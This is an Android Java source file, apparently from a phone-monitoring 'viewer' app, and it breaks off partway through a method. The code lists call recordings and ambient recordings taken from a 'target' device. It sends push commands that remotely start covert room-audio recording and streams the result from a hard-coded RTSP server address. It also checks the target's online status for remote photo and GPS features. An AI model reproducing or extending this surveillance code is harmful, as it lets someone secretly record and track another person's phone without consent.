/*
  ClassName: PhotoHistory.java
  AppName: ViewerApp
  Created by Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-11-16
  Description:
  History:2018-11-19
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.scp.viewer.View;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.appcompat.widget.Toolbar;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.MediaController;
import android.widget.ProgressBar;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.VideoView;

import com.google.gson.Gson;
import com.scp.viewer.API.APIMethod;
import com.scp.viewer.API.APIURL;
import com.scp.viewer.Adapter.AdapterPhoneCallRecordHistory;
import com.scp.viewer.Database.DatabaseAmbientRecord;
import com.scp.viewer.Database.DatabaseLastUpdate;
import com.scp.viewer.Database.DatabasePhoneCallRecord;
import com.scp.viewer.Model.AmbientRecord;
import com.scp.viewer.Model.AudioGroup;
import com.scp.viewer.Model.DeviceStatus;
import com.scp.viewer.Model.PhoneCallRecordJson;
import com.scp.viewer.Model.Table;
import com.scp.viewer.R;
import com.r0adkll.slidr.Slidr;
import com.wang.avi.AVLoadingIndicatorView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Objects;

import static com.scp.viewer.API.APIDatabase.getTimeItem;
import static com.scp.viewer.API.APIMethod.GetJsonCheckConnectionFeature;
import static com.scp.viewer.API.APIMethod.GetJsonFeature;
import static com.scp.viewer.API.APIMethod.PostJsonClearDataToServer;
import static com.scp.viewer.API.APIMethod.alertDialogDeleteItems;
import static com.scp.viewer.API.APIMethod.getMilliFromDate;
import static com.scp.viewer.API.APIMethod.getSharedPreferLong;
import static com.scp.viewer.API.APIMethod.setSharedPreferLong;
import static com.scp.viewer.API.APIMethod.setToTalLog;
import static com.scp.viewer.API.APIMethod.startAnim;
import static com.scp.viewer.API.APIMethod.stopAnim;
import static com.scp.viewer.API.APIMethod.updateViewCounterAll;
import static com.scp.viewer.API.APIURL.bodyLogin;
import static com.scp.viewer.API.APIURL.deviceObject;
import static com.scp.viewer.API.APIURL.getTimeNow;
import static com.scp.viewer.API.APIURL.isConnected;
import static com.scp.viewer.API.APIURL.noInternet;
import static com.scp.viewer.API.Global.AMBIENT_RECORDING_TOTAL;
import static com.scp.viewer.API.Global.File_PATH_SAVE_PHONE_CALL_RECORD;
import static com.scp.viewer.API.Global.LIMIT_REFRESH;
import static com.scp.viewer.API.Global.NEW_ROW;
import static com.scp.viewer.API.Global.NumberLoad;
import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_PULL_ROW;
import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_TOTAL;
import static com.scp.viewer.API.Global.POST_CLEAR_MULTI_PHONE_RECORDING;
import static com.scp.viewer.API.Global.TYPE_CHECK_CONNECTION;
import static com.scp.viewer.API.Global.TYPE_GET_GPS_NOW;
import static com.scp.viewer.API.Global.TYPE_START_AMBIENT_RECORDING;
import static com.scp.viewer.API.Global.TYPE_TAKE_A_PICTURE;
import static com.scp.viewer.API.Global._TOTAL;
import static com.scp.viewer.API.Global.checkInternet;
import static com.scp.viewer.API.Global.time_Refresh_Device;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_PHONE_CALL_RECORDING;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.TABLE_LAST_UPDATE;
import static com.scp.viewer.View.HistoryLocation.countDownTimer;
import static com.scp.viewer.View.HistoryLocation.setProgressNow;
import static com.scp.viewer.View.HistoryLocation.txt_Current_Position;
import static com.scp.viewer.View.PhotoHistory.txt_Result_Photo;

public class PhoneCallRecordHistory extends AppCompatActivity {

    private Toolbar toolbar;
    private RecyclerView mRecyclerView;
    private RecyclerView.Adapter mAdapter;
    List<AudioGroup> mData = new ArrayList<>();
    public static boolean isInActionMode;
    public static ArrayList<AudioGroup> selectionList;
    public static DatabasePhoneCallRecord databasePhoneCallRecord;
    public static DatabaseAmbientRecord databaseAmbientRecord;
    private DatabaseLastUpdate database_last_update;
    private Table table;
    private String functionName;
    private final int EXTERNAL_STORAGE_PERMISSION_CONSTANT = 26;
    private TextView txt_No_Data_PhoneCallRecord, txt_Total_Data;
    private LinearLayout lnl_Total;
    private SwipeRefreshLayout swp_PhoneCallRecord;
    private  List<PhoneCallRecordJson> phoneCallRecordList = new ArrayList<>();
    private  List<AmbientRecord> ambientRecordList = new ArrayList<>();
    private String min_Time = "",Date_max;
    public static boolean request;
    boolean isLoading = false;
    private ProgressBar progressBar_PhoneCall;
    boolean endLoading = false;
    private boolean checkLoadMore = false;
    private boolean checkRefresh = false;
    private int currentSize = 0;
    boolean selectAll = false;
    private AVLoadingIndicatorView avLoadingIndicatorView;



    // Dialog
    private AlertDialog.Builder mBuilder;
    private AlertDialog dialog;
    private ProgressBar PrB_Ambient_Voice_Recording;
    private VideoView viv_Result;
    private CardView crv_Ambient_Voice_Recording;
    private LinearLayout ln_Show_Video, ln_Progress_Ambient_Voice_Recording, ln_Error_Ambient;
    private TextView txt_Percent, txt_Seconds, txt_Result, txt_Device_Name;
    public static TextView txt_Error_Detail;
    private SeekBar sb_Play_Ambient;
    private String minDateCheck;
    private ImageView img_Cancel_VideoView;
    private AVLoadingIndicatorView aviLoadingAmbient;
    String minDate;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_phone_call_record);
        Slidr.attach(this);
        selectionList = new ArrayList<>();
        isInActionMode = false;
        databasePhoneCallRecord = new DatabasePhoneCallRecord(this);
        databaseAmbientRecord = new DatabaseAmbientRecord(this);
        database_last_update = new DatabaseLastUpdate(this);
        table = (Table) getIntent().getSerializableExtra("tablePhoneCallRecord");
        functionName =  getIntent().getStringExtra("nameFeature");
        Log.d("AmbientMediaLink", functionName);
        setID();
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(this);
        mRecyclerView.setHasFixedSize(true);
        mRecyclerView.setLayoutManager(mLayoutManager);

        if (ContextCompat.checkSelfPermission(PhoneCallRecordHistory.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(PhoneCallRecordHistory.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, EXTERNAL_STORAGE_PERMISSION_CONSTANT);
        } else {

            request = true;
        }
        getPhoneCallHistoryInfo();
        swipeRefreshLayout();
    }

    private void setID() {

        toolbar = findViewById(R.id.toolbar_PhoneCallRecord);

        if(functionName.equals("GetPhoneRecording"))
            toolbar.setTitle(MyApplication.getResourcses().getString(R.string.PHONE_CALL_RECORDING));
        else
            toolbar.setTitle(MyApplication.getResourcses().getString(R.string.AMBIENT_RECORDING));

        toolbar.setBackgroundResource(R.drawable.custom_bg_shopp);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        }
        mRecyclerView = findViewById(R.id.rcl_PhoneCallRecord_History);
        lnl_Total = findViewById(R.id.lnl_Total);
        lnl_Total.setVisibility(View.INVISIBLE);
        txt_No_Data_PhoneCallRecord = findViewById(R.id.txt_No_Data_PhoneCallRecord);
        txt_Total_Data = findViewById(R.id.txt_Total_Data);
        progressBar_PhoneCall = findViewById(R.id.progressBar_PhoneCall);
        avLoadingIndicatorView = findViewById(R.id.aviPhoneCall);
        progressBar_PhoneCall.setVisibility(View.GONE);
        swp_PhoneCallRecord = findViewById(R.id.swp_PhoneCallRecord);
    }

    /**
     * This is a method to get data from the server to the device and display it in Recyclerview.
     * If there is no internet, get data from SQLite stored on the device and display it in Recyclerview.
     */
    @SuppressLint("SetTextI18n")
    private void getPhoneCallHistoryInfo() {

        if (isConnected(this)) {
            avLoadingIndicatorView.setVisibility(View.VISIBLE);
            startAnim(avLoadingIndicatorView);
            new getPhoneCallRecordAsyncTask(0).execute();
        } else {

            lnl_Total.setVisibility(View.VISIBLE);
            Toast.makeText(this, R.string.TurnOn, Toast.LENGTH_SHORT).show();
            int i;
            if(functionName.equals("GetPhoneRecording"))
            {
                i = databasePhoneCallRecord.getPhoneCallRecordCount(table.getDevice_Identifier());
                if (i == 0) {
                    txt_No_Data_PhoneCallRecord.setText(MyApplication.getResourcses().getString(R.string.NoData));
                    txt_Total_Data.setText("0");
                }
                else {
                    mData.clear();
                    mData = databasePhoneCallRecord.getAll_PhoneCallRecord_ID_History(table.getID(),0);
                    txt_Total_Data.setText(getSharedPreferLong(getApplicationContext(), PHONE_CALL_RECORDING_TOTAL  + table.getDevice_Identifier())+"");
                    txt_No_Data_PhoneCallRecord.setText("Last update: "+ getTimeItem(database_last_update.getLast_Time_Update(COLUMN_LAST_PHONE_CALL_RECORDING, TABLE_LAST_UPDATE, table.getDevice_Identifier()),null));
                }
            }
            else {
                i = databaseAmbientRecord.getPhoneCallRecordCount(table.getDevice_Identifier());
                if (i == 0) {
                    txt_No_Data_PhoneCallRecord.setText(MyApplication.getResourcses().getString(R.string.NoData));
                    txt_Total_Data.setText("0");
                }else {
                    mData.clear();
                    mData = databaseAmbientRecord.getAll_PhoneCallRecord_ID_History(table.getDevice_Identifier(),currentSize);
                    txt_Total_Data.setText(getSharedPreferLong(getApplicationContext(), AMBIENT_RECORDING_TOTAL  + table.getDevice_Identifier())+"");
                    txt_No_Data_PhoneCallRecord.setText("Last update: "+ getTimeItem(database_last_update.getLast_Time_Update(COLUMN_LAST_PHONE_CALL_RECORDING, TABLE_LAST_UPDATE, table.getDevice_Identifier()),null));
                }
            }
            mAdapter = new AdapterPhoneCallRecordHistory(this, mData);
            mRecyclerView.setAdapter(mAdapter);
            mAdapter.notifyDataSetChanged();
            if(mData.size() >= NumberLoad)
            {
                initScrollListener();
            }
        }
    }

    /**
     * This is a feature load more for user view data in the type as page as on web each time only see 30 items after that when the last scod down, new load data after.
     */
    private void initScrollListener() {
        mRecyclerView.addOnScrollListener(new RecyclerView.OnScrollListener() {
            @Override
            public void onScrollStateChanged(@NonNull RecyclerView recyclerView, int newState) {
                super.onScrollStateChanged(recyclerView, newState);
            }

            @Override
            public void onScrolled(@NonNull RecyclerView recyclerView, int dx, int dy) {
                super.onScrolled(recyclerView, dx, dy);

                LinearLayoutManager linearLayoutManager = (LinearLayoutManager) recyclerView.getLayoutManager();
                // && !endLoading
                if (!isLoading && (!endLoading))
                {
                    if (linearLayoutManager != null && linearLayoutManager.findLastCompletelyVisibleItemPosition() == mData.size() - 1) {
                        //bottom of list!
                        isLoading = true;
                        progressBar_PhoneCall.setVisibility(View.VISIBLE);
                        //loadMore();

                        if(!checkRefresh)
                        {
                            loadMore();
                        }
                        else {
                            isLoading = false;
                            endLoading = false;
                            progressBar_PhoneCall.setVisibility(View.GONE);
                            checkRefresh = false;
                        }
                    }
                }
            }
        });
    }

    /**
     * loadMore this is the parship support each page are display the 30 items
     * and after that when user load down the same same will going to load more 30 items to when the all.
     */
    private void loadMore() {
        try {

            checkLoadMore = true;
            currentSize =  mData.size();
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {

                    if(isConnected(getApplicationContext()))
                    {
                        // Here is the total item value contact of device current has on CPanel
                        long totalPhoneCall = getSharedPreferLong(getApplicationContext(), PHONE_CALL_RECORDING_TOTAL);
                        new getPhoneCallRecordAsyncTask(currentSize+1).execute();
                        if((mData.size()+1) >= totalPhoneCall)
                        {
                            endLoading = true;
                        }
                        isLoading = false;

                    }
                    else {
                        List<AudioGroup> mDataStamp = databasePhoneCallRecord.getAll_PhoneCallRecord_ID_History(table.getID(),currentSize);
                        // Here is the total item value contact of device current has on Cpanel
                        int insertIndex = mData.size();
                        mData.addAll(insertIndex,mDataStamp);
                        mAdapter.notifyItemRangeInserted(insertIndex-1, mDataStamp.size() );
                        if(mDataStamp.size() < NumberLoad)
                        {
                            endLoading = true;
                        }
                        //mAdapter.notifyDataSetChanged();
                        //progressBar_Locations.setVisibility(View.GONE);
                        isLoading = false;
                        progressBar_PhoneCall.setVisibility(View.GONE);
                    }

                }
            }, 100);

        }catch (Exception e)
        {
            e.getMessage();
        }
    }

    @SuppressLint("StaticFieldLeak")
    private class getPhoneCallRecordAsyncTask extends AsyncTask<String, Void, String> {
        long startIndex;

        public getPhoneCallRecordAsyncTask(long startIndex) {
            this.startIndex = startIndex;
        }

        @Override
        protected String doInBackground(String... strings) {

            return GetJsonFeature(table, this.startIndex,functionName);
        }

        @Override
        protected void onCancelled(String s) {
            super.onCancelled(s);
        }

        @SuppressLint("SetTextI18n")
        @Override
        protected void onPostExecute(String s) {
            try {

                deviceObject(s);
                JSONObject jsonObj = new JSONObject(bodyLogin.getData());
                List<AudioGroup> mDataTamp;
                 if(functionName.equals("GetPhoneRecording"))
                 {
                     JSONObject jsonObjData = jsonObj.getJSONObject("Data");
                     Log.d("AmbientMediaLink", functionName);
                     String jsonObjCDN_URL = jsonObj.getString("CDN_URL");
                     JSONArray GPSJson = jsonObjData.getJSONArray("Table");
                     JSONArray GPSJsonTable1 = jsonObjData.getJSONArray("Table1");
                     setToTalLog(GPSJsonTable1, PHONE_CALL_RECORDING_TOTAL  + table.getDevice_Identifier(), getApplicationContext());
                     setSharedPreferLong(getApplicationContext(), PHONE_CALL_RECORDING_PULL_ROW +_TOTAL+ table.getDevice_Identifier() + NEW_ROW, 0);

                     if (GPSJson.length() != 0) {

                         for (int i = 0; i < GPSJson.length(); i++) {
                             Gson gson = new Gson();
                             PhoneCallRecordJson phoneCallRecordJson = gson.fromJson(String.valueOf(GPSJson.get(i)), PhoneCallRecordJson.class);
                             phoneCallRecordJson.setIsSaved(0);
                             phoneCallRecordJson.setCDN_URL(jsonObjCDN_URL);
                             phoneCallRecordList.add(phoneCallRecordJson);
                             Log.d("phoneCallRecordJson"," Add Contact = "+  phoneCallRecordJson.getContact_Name());
                         }
                         if (phoneCallRecordList.size() != 0) {
                             databasePhoneCallRecord.addDevice_PhoneCallRecord_Fast(phoneCallRecordList);
                         }
                     }
                     Log.d("ContactHistory"," currentSize Contact = "+  currentSize+ " checkLoadMore = "+ checkLoadMore);
                     mDataTamp = databasePhoneCallRecord.getAll_PhoneCallRecord_ID_History(table.getID(),currentSize);
                     txt_Total_Data.setText(getSharedPreferLong(getApplicationContext(), PHONE_CALL_RECORDING_TOTAL  + table.getDevice_Identifier())+"");
                 }
                 else {

                     /*
                     {
                        "date": "8/11/2020 9:42:16 AM",
                        "fileName": "358333086268268_0.mp4",
                        "duration": "00:04:15",
                        "size": 1044656
                        }
                      */
                     Log.d("AmbientMediaLink", functionName);
                     if(jsonObj.toString().contains("AmbientMediaLink"))
                     {
                         String jsonObjAmbientMediaLink = jsonObj.getString("AmbientMediaLink");
                         JSONArray GPSJson = jsonObj.getJSONArray("Rows");
                         try {
                             String totalRows = jsonObj.getString("TotalRow");
                             if(totalRows != null)
                             {
                                 setSharedPreferLong(getApplicationContext(), AMBIENT_RECORDING_TOTAL  + table.getDevice_Identifier(),Long.parseLong(totalRows));
                             }
                         } catch (JSONException e) {
                             e.printStackTrace();
                         }

                         if (GPSJson.length() != 0)
                         {
                             for (int i = 0; i < GPSJson.length(); i++) {
                                 Gson gson = new Gson();
                                 AmbientRecord ambientRecord = gson.fromJson(String.valueOf(GPSJson.get(i)), AmbientRecord.class);
                                 ambientRecord.setAmbientMediaLink(jsonObjAmbientMediaLink);
                                 ambientRecord.setIsSaved(0);
                                 ambientRecord.setDeviceID(table.getDevice_Identifier());
                                 Log.d("AmbientMediaLink"," Add Contact = "+  ambientRecord.getFileName() + " DeviceID = "+ table.getDevice_Identifier());
                                 ambientRecordList.add(ambientRecord);
                             }
                             if (ambientRecordList.size() != 0) {
                                 databaseAmbientRecord.addDevice_AmbientRecord_Fast(ambientRecordList);
                             }
                         }
                         txt_Total_Data.setText(getSharedPreferLong(getApplicationContext(), AMBIENT_RECORDING_TOTAL  + table.getDevice_Identifier())+"");

                     }else {
                         txt_Total_Data.setText("0");
                     }

                     Log.d("ContactHistory"," currentSize Contact = "+  currentSize+ " checkLoadMore = "+ checkLoadMore);
                     mDataTamp = databaseAmbientRecord.getAll_PhoneCallRecord_ID_History(table.getDevice_Identifier(),currentSize);
                 }

                if(checkLoadMore)
                {
                    int insertIndex = mData.size();
                    //mData.addAll(insertIndex, mDataTamp);
                    if(mDataTamp.size() >= 20)
                    {
                        mData.addAll(insertIndex, mDataTamp);
                    }else {
                        mData.addAll(insertIndex-1, mDataTamp);
                    }

                    mAdapter.notifyItemRangeInserted(insertIndex-1,mDataTamp.size() );
                    Log.d("CallHistory"," checkLoadMore Contact = "+ true);
                    progressBar_PhoneCall.setVisibility(View.GONE);
                }
                else {
                    lnl_Total.setVisibility(View.VISIBLE);
                    Log.d("CallHistory"," checkLoadMore Contact = "+ false);
                    mData.clear();
                    mData.addAll(mDataTamp);
                    if(mData.size() >= NumberLoad)
                    {
                        initScrollListener();
                    }

                    mAdapter = new AdapterPhoneCallRecordHistory(PhoneCallRecordHistory.this,  mData);
                    mRecyclerView.setAdapter(mAdapter);
                    mAdapter.notifyDataSetChanged();
                }

                Date_max = getTimeNow();
                database_last_update.update_Last_Time_Get_Update(TABLE_LAST_UPDATE, COLUMN_LAST_PHONE_CALL_RECORDING, Date_max, table.getDevice_Identifier());

                if (mData.size() == 0) {

                    txt_No_Data_PhoneCallRecord.setText(MyApplication.getResourcses().getString(R.string.NoData));
                    txt_Total_Data.setText("0");
                }else {
                    txt_No_Data_PhoneCallRecord.setText("Last update: "+ getTimeItem(database_last_update.getLast_Time_Update(COLUMN_LAST_PHONE_CALL_RECORDING, TABLE_LAST_UPDATE, table.getDevice_Identifier()),null));
                }
                stopAnim(avLoadingIndicatorView);

            } catch (JSONException e) {
                //MyApplication.getInstance().trackException(e);
                e.printStackTrace();
            }
        }
    }


    /**
     * setDialog this is the Dialog constructor for the take-a-photo method.
     */
    @SuppressLint({"SetTextI18n", "ClickableViewAccessibility"})
    public void setDialog(final Activity mActivity)
    {
        mBuilder = new AlertDialog.Builder(mActivity);
        @SuppressLint("InflateParams") View mView = LayoutInflater.from(mActivity).inflate(R.layout.item_dialog_pushnotification_ambient_recording, null);

        // Progress Bar
        PrB_Ambient_Voice_Recording = mView.findViewById(R.id.PrB_Ambient_Voice_Recording);

        // TextView
        txt_Percent = mView.findViewById(R.id.txt_Percent);
        txt_Seconds = mView.findViewById(R.id.txt_Seconds);
        txt_Result = mView.findViewById(R.id.txt_Result);
        sb_Play_Ambient = mView.findViewById(R.id.sb_Play_Ambient);
        //txt_Device_Name
        //txt_Error_Detail
        txt_Device_Name = mView.findViewById(R.id.txt_Device_Name);
        txt_Error_Detail = mView.findViewById(R.id.txt_Error_Detail);

        // CardView
        crv_Ambient_Voice_Recording = mView.findViewById(R.id.crv_Ambient_Voice_Recording);

        // ImageView
        viv_Result = mView.findViewById(R.id.viv_Result);
        img_Cancel_VideoView = mView.findViewById(R.id.img_Cancel_VideoView);

        //aviLoadingAmbient
        aviLoadingAmbient = mView.findViewById(R.id.aviLoadingAmbient);
        aviLoadingAmbient.setVisibility(View.GONE);

        // LinearLayout
        ln_Show_Video = mView.findViewById(R.id.ln_Show_Video);
        ln_Progress_Ambient_Voice_Recording = mView.findViewById(R.id.ln_Progress_Ambient_Voice_Recording);
        ln_Show_Video.setVisibility(View.GONE);
        ln_Error_Ambient = mView.findViewById(R.id.ln_Error_Ambient);
        ln_Error_Ambient.setVisibility(View.GONE);

        mBuilder.setView(mView);
        dialog = mBuilder.create();
        Objects.requireNonNull(dialog.getWindow()).setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(false);
        dialog.show();
        //txt_Percent.setText(getApplicationContext().getResources().getString(R.string.to_complete,0)+ "%");
        setProgressNow(0, txt_Percent, PhoneCallRecordHistory.this);
        img_Cancel_VideoView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                // 1: start ambient
                // 0: stop ambient
                new APIMethod.PushNotification(table.getID(), TYPE_START_AMBIENT_RECORDING, table.getDevice_Identifier(), 0).execute();
                dialog.dismiss();
            }
        });

        dialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
            @Override
            public void onDismiss(DialogInterface dialogInterface) {
                // handle when exiting dialog
                // 1: start ambient
                // 0: stop ambient
                new APIMethod.PushNotification(table.getID(), TYPE_START_AMBIENT_RECORDING, table.getDevice_Identifier(), 0).execute();
            }
        });

        sb_Play_Ambient.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent motionEvent) {
                return true;
            }
        });
    }

    /**
     * takeAPhoto this is the method to handle the remote photography event
     * step 1: pushNotification to target app, 1: capture with front camera; 2: taken with the back camera
     * step 2: wait 20s
     * step 3: after waiting for 30 seconds, get a new photo and display it on the custom Dialog for users to see directly.
     */
    private void ambient_Voice_Recording()
    {
        //Take_a_Photo_Font
        minDateCheck = getTimeNow();
        // minDateCheck is the time to compare with last online to see if it's too big to show the device is online or offline.
        setDialog(PhoneCallRecordHistory.this);
        // Dialog includes: Process name, Progress, Detailed target device information (Display can't get device information when Network Offline)
        // Display custom process Dialog at 0% Starting...
        // handle get gps now
        setProgressNow(20, txt_Percent, PhoneCallRecordHistory.this);
        // handle check connection
        // 1: start ambient
        // 0: stop ambient
        new APIMethod.PushNotification(table.getID(), TYPE_START_AMBIENT_RECORDING, table.getDevice_Identifier(), 1).execute();
        new APIMethod.PushNotification(table.getID(), TYPE_CHECK_CONNECTION, table.getDevice_Identifier(), 0).execute();
        minDate = getTimeNow();
        // Show Dialog custom process at 30% Push notification to the target app.
        setProgressNow(30, txt_Percent, PhoneCallRecordHistory.this);
        countDownTimer(txt_Seconds, txt_Percent, PhoneCallRecordHistory.this);
        setDePlay(minDate);
    }

    /**
     * setDePlay is the method to wait for how many seconds before performing the next steps.
     */
    public void setDePlay(final String minDate)
    {
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                dialog.setCancelable(false);
                aviLoadingAmbient.setVisibility(View.VISIBLE);
                // The processor obtains information about the current state of the target device.
                ln_Show_Video.setVisibility(View.VISIBLE);
                ln_Progress_Ambient_Voice_Recording.setVisibility(View.GONE);

                //Creating MediaController
                MediaController mediaController= new MediaController(PhoneCallRecordHistory.this);
                mediaController.setAnchorView(viv_Result);
                //specify the location of media file//table.getID()
                String ambientURI = "rtsp://69.64.74.242:1935/copy9/" + table.getDevice_Identifier();
                Log.d("ambientURI", "ambientURI ="+ ambientURI);
                Uri uri=Uri.parse(ambientURI);

                //Setting MediaController and URI, then starting the videoView
                viv_Result.setMediaController(mediaController);
                viv_Result.setVideoURI(uri);
                viv_Result.requestFocus();
                //viv_Result.start();


                viv_Result.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
                    // Close the progress bar and play the video
                    public void onPrepared(MediaPlayer mp) {
                        aviLoadingAmbient.setVisibility(View.GONE);
                        viv_Result.start();
                        Log.d("viv_Result", "position = viv_Result.start()");
                    }
                });

                viv_Result.setOnErrorListener(new MediaPlayer.OnErrorListener() {
                    @SuppressLint("SetTextI18n")
                    @Override
                    public boolean onError(MediaPlayer mp, int what, int extra) {
                        Log.d("video", "setOnErrorListener ");
                        aviLoadingAmbient.setVisibility(View.GONE);
                        ln_Show_Video.setVisibility(View.GONE);
                        ln_Error_Ambient.setVisibility(View.VISIBLE);
                        txt_Device_Name.setText("Can't play this video");
                        // check internet of the target app
                        // The processor obtains information about the current state of the target device.
                        new PhoneCallRecordHistory.checkConnectAsyncTask(minDate, table.getDevice_Identifier(), TYPE_START_AMBIENT_RECORDING, PhoneCallRecordHistory.this).execute();
                        dialog.setCancelable(true);
                        //txt_Error_Detail.setText();
                        Log.d("viv_Result", "position = setOnErrorListener");
                        return true;
                    }
                });

                ///count down timer
                //countDownTimerCheckPlaying(viv_Result, PhoneCallRecordHistory.this, aviLoadingAmbient);
            }
        }, 20000);
    }

    /**
     * checkConnectAsyncTask this is the AsyncTask method that calls the server to get the latest status information of the target device.
     */
    public static class checkConnectAsyncTask extends AsyncTask<String, Void, String>
    {

        String minDate, device_Identifier, name_Type;
        Activity activity;

        public checkConnectAsyncTask(String minDate, String device_Identifier, String name_Type, Activity activity) {
            this.minDate = minDate;
            this.device_Identifier = device_Identifier;
            this.name_Type = name_Type;
            this.activity = activity;
        }

        @Override
        protected String doInBackground(String... strings)
        {

            Log.d("locationId", device_Identifier + "");
            return GetJsonCheckConnectionFeature(device_Identifier);
        }

        @SuppressLint("SetTextI18n")
        @Override
        protected void onPostExecute(String s) {
            try {

                // Display custom process Dialog at 70% Get GPS now...
                APIURL.deviceObject(s);
                JSONObject jsonObj = new JSONObject(APIURL.bodyLogin.getData());

                if (!APIURL.bodyLogin.getData().isEmpty())
                {
                    Gson gson = new Gson();
                    DeviceStatus deviceStatus = gson.fromJson(String.valueOf(jsonObj), DeviceStatus.class);

                    if(deviceStatus != null && deviceStatus.getLastOnline()!= null
                            && getMilliFromDate(minDate) < (getMilliFromDate(deviceStatus.getLastOnline()) + 15000))
                    {
                        checkInternet = true;
                    }
                    else
                    {
                        // error when converting Check-Connection data
                        checkInternet = false;
                    }
                }
                else
                {
                    checkInternet = false;
                }

                // Show error why can't get information like Image, Location, Recording remotely to target device.
                showErrorInternet(checkInternet, name_Type, activity);

            } catch (JSONException e) {
                e.printStackTrace();
                checkInternet = false;
                // error when get Check-Connection data
                showErrorInternet(checkInternet, name_Type, activity);
            }
        }
    }

    /**
     * showErrorInternet is the method of handling that shows that the remote data cannot be retrieved error is caused by the internet or by not enabling its features.
     * @param checkInternet Network status is on or off
     * @param name_Type The name of the type of remote data collection includes: Take-A-Photo, Start-Ambient-Voice-Recording, Get-GPS-Now
     * @param activity main activity of this error
     */
    private static void showErrorInternet(boolean checkInternet, String name_Type, Activity activity)
    {
        if(checkInternet)
        {
            if(name_Type.equals(TYPE_START_AMBIENT_RECORDING))
            {
                txt_Error_Detail.setText(activity.getResources().getString(R.string.the_target_s_device_is_currently_offline));
            }else if(name_Type.equals(TYPE_GET_GPS_NOW))
            {
                txt_Current_Position.setText(activity.getResources().getString(R.string.the_target_is_offline_location));
            }
            else //name_Type.equals(TYPE_TAKE_A_PICTURE)
            {
                txt_Result_Photo.setText(activity.getResources().getString(R.string.the_target_is_offline_photo));
            }
        }
        else
        {
            if(name_Type.equals(TYPE_START_AMBIENT_RECORDING))
            {
                txt_Error_Detail.setText(activity.getResources().getString(R.string.the_target_is_offline));
            }else if(name_Type.equals(TYPE_GET_GPS_NOW))
            {
                txt_Current_Position.setText(activity.getResources().getString(R.string.the_target_is_offline));
            }
            else //name_Type.equals(TYPE_TAKE_A_PICTURE)
            {
                txt_Result_Photo.setText(activity.getResources().getString(R.string.the_target_is_offline));
            }
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String permissions[], @NonNull int[] grantResults) {

        switch (requestCode) {
            case EXTERNAL_STORAGE_PERMISSION_CONSTANT: {

                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    finish();
                    startActivity(getIntent());
                    request = true;
                } else {
                    request = false;
                    Toast.makeText(this, "You please accept the file read permission to save audio!", Toast.LENGTH_LONG).show();
                    finish();
                }
            }
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        if(functionName.equals("GetPhoneRecording"))
            getMenuInflater().inflate(R.menu.menu_main, menu);
        else
            getMenuInflater().inflate(R.menu.menu_action_play_ambient, menu);
        return true;
    }

    public void prepareToolbar(int position) {
        // prepare action mode
        toolbar.getMenu().clear();
        toolbar.inflateMenu(R.menu.menu_action_delete);
        isInActionMode = true;
        mAdapter.notifyDataSetChanged();
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
            getSupportActionBar().setHomeAsUpIndicator(R.drawable.ic_clear_black_24dp);
        }
        prepareSelection(position);
    }

    public void prepareSelection(int position) {

        if (!selectionList.contains(mData.get(position))) {
            selectionList.add(mData.get(position));
        } else {
            selectionList.remove(mData.get(position));
        }
        updateCounter();
    }

    public void updateCounter() {
        int counter = selectionList.size();
        updateViewCounterAll(toolbar, counter);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.item_delete)
        {
            if (isConnected(PhoneCallRecordHistory.this)) {

                alertDialogDeleteItems(PhoneCallRecordHistory.this,
                        getApplicationContext().getResources().getString(R.string.question_Select),
                        new clear_PhoneCallRecordAsyncTask());

            } else {

                Toast.makeText(this, getResources().getString(R.string.TurnOn), Toast.LENGTH_SHORT).show();
                clearActionMode();
            }
        }
        else if(item.getItemId() ==  R.id.item_select_all)
        {
            if(!selectAll)
            {
                selectAll = true;
                selectionList.clear();
                selectionList.addAll(mData);
                updateCounter();
